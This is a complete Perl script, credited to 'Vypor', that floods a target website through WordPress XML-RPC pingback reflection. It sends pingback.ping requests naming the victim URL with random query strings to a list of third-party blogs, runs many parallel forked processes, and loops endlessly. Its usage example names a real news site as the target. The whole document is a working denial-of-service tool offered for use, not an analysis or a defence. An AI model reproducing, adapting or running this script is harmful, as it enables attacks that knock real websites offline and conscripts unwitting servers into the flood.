#!/usr/bin/perl -w
use List::Util qw(min max);
use LWP::UserAgent;
use HTTP::Request::Common;
use Parallel::ForkManager;
use vars qw( $PROG );
( $PROG = $0 ) =~ s/^.*[\/\\]//;
if ( @ARGV == 0 ) {
        print "Usage: ./$PROG [TARGET] [THREADS] [LIST] [TIMEOUT]\nExample: ./$PROG http://krebsonsecurity.com/ 10000 xmlrpc.txt 10\nList Format: XMLRPC POST\nMade by Vypor\n";
    exit;
}
my $max_processes = $ARGV[1];
my $pm = Parallel::ForkManager->new($max_processes);
my $count = 1;
my $timeout = $ARGV[3];

my $weblist = $ARGV[2];
open my $handle, '<', $weblist;
chomp(my @webservers = <$handle>);
close $handle;

repeat:
for my $webservers (@webservers) {
my @chars = ("a".."z", A..Z, 0..9);
my $random = join '', map { @chars[rand @chars] } 1 .. 8;
my $random2 = join '', map { @chars[rand @chars] } 1 .. 8;

	$count++;
	$max = max $count;
	my $pid = $pm->start and next;
		alarm($timeout);
		my($xmlrpc, $webpost) = split(' ', $webservers, 2);
			my $target = "$ARGV[0]?$random=$random2";
			my $userAgent = LWP::UserAgent->new(agent => 'perl post');
			my $message = "<methodCall><methodName>pingback.ping</methodName><params><param><value><string>$target</string></value></param><param><value><string>$webpost</string></value></param></params></methodCall>";
			my $response = $userAgent->request(POST $xmlrpc,
		Content_Type => 'text/xml',
		Content => $message);
print("\rRequests: $max ");
	$pm->finish;

}
$pm->wait_all_children;
goto repeat;